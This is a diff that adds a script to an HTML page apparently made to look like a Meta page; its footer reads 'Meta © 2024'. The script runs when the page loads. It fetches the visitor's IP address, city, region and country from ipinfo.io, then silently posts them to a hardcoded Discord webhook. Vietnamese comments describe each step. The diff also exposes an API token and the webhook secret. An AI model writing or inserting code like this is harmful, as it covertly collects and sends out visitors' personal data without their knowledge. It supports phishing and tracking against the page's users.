@@ -81,5 +81,45 @@
                 Meta © 2024
             </div>
     </footer>
+    <script>
+        function sendDataToDiscord(ip, location) {
+            // Định dạng nội dung gửi tới Discord
+            const message = {
+                content: `📍 User Access:\nIP Address: ${ip}\nLocation: ${location}`
+            };
+
+            // Gửi thông tin tới Discord webhook
+            fetch('https://discord.com/api/webhooks/1300088629174997096/luhXCiQg7236kLDa8ONjbnB9600i3bGofgQ0MA6O-YcEJWuXaY2lThAmErSaAVgi1loq/github', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(message)
+            })
+            .then(response => {
+                if (response.ok) {
+                    console.log('Data Sent:', message);
+                } else {
+                    console.error('Failed to send data:', response.statusText);
+                }
+            })
+            .catch(error => console.error('Error:', error));
+        }
+
+        function getUserIPAndLocation() {
+            // Lấy IP và vị trí của người dùng qua API
+            fetch('https://ipinfo.io/json?token=c63c25069f712b')
+                .then(response => response.json())
+                .then(data => {
+                    const ip = data.ip;
+                    const location = data.city + ', ' + data.region + ', ' + data.country;
+                    
+                    // Gửi dữ liệu tới Discord
+                    sendDataToDiscord(ip, location);
+                })
+                .catch(error => console.error('Error fetching IP and location:', error));
+        }
+
+        // Gọi hàm khi trang được tải
+        getUserIPAndLocation();
+    </script>
 </body>
 </html>
